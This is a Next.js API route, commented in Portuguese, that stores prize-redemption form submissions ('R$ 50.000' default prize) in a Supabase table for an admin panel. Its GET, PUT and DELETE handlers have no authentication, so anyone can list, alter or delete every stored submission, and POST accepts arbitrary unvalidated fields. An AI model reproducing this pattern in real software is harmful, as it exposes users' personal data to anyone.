import { NextRequest, NextResponse } from 'next/server'
import { supabase, REDEMPTIONS_TABLE } from '@/lib/db'

export async function POST(request: NextRequest) {
  try {
    const formData = await request.formData()

    const values: any = {}
    for (const [key, value] of formData.entries()) {
      values[key] = value
    }

    // Adicionar timestamp
    values.timestamp = new Date().toISOString()

    // Campos usados pelo painel administrativo
    values.protocolo = values.protocolo || `RG-${Date.now().toString(36).toUpperCase()}`
    values.premio = values.premio || 'R$ 50.000'
    values.status = values.status || 'pendente'
    values.data = values.data || new Date().toLocaleDateString('pt-BR')
    values.hora = values.hora || new Date().toLocaleTimeString('pt-BR')

    const { data, error } = await supabase
      .from(REDEMPTIONS_TABLE)
      .insert(values)
      .select()
      .single()

    if (error) throw error

    console.log('Nova submissão recebida:', data)

    return NextResponse.json({ success: true, protocolo: data.protocolo, id: data.id })
  } catch (error) {
    console.error('Erro ao processar submissão:', error)
    return NextResponse.json({ success: false, error: 'Erro ao processar a solicitação' }, { status: 500 })
  }
}

// Endpoint para obter todas as submissões
export async function GET() {
  try {
    const { data, error } = await supabase
      .from(REDEMPTIONS_TABLE)
      .select('*')
      .order('id', { ascending: false })

    if (error) throw error

    return NextResponse.json(data)
  } catch (error) {
    console.error('Erro ao buscar submissões:', error)
    return NextResponse.json({ error: 'Erro ao buscar as solicitações' }, { status: 500 })
  }
}

// Endpoint para atualizar uma submissão
export async function PUT(request: NextRequest) {
  try {
    const { id, ...updateData } = await request.json()

    const { data, error } = await supabase
      .from(REDEMPTIONS_TABLE)
      .update(updateData)
      .eq('id', id)
      .select()
      .single()

    if (error) throw error

    if (!data) {
      return NextResponse.json({ success: false, error: 'Submissão não encontrada' }, { status: 404 })
    }

    return NextResponse.json({ success: true, submission: data })
  } catch (error) {
    console.error('Erro ao atualizar submissão:', error)
    return NextResponse.json({ success: false, error: 'Erro ao atualizar a solicitação' }, { status: 500 })
  }
}

// Endpoint para excluir uma submissão
export async function DELETE(request: NextRequest) {
  try {
    const id = new URL(request.url).searchParams.get('id')
    if (!id) {
      return NextResponse.json({ success: false, error: 'ID não informado' }, { status: 400 })
    }

    const { error } = await supabase
      .from(REDEMPTIONS_TABLE)
      .delete()
      .eq('id', id)

    if (error) throw error

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('Erro ao excluir submissão:', error)
    return NextResponse.json({ success: false, error: 'Erro ao excluir a solicitação' }, { status: 500 })
  }
}
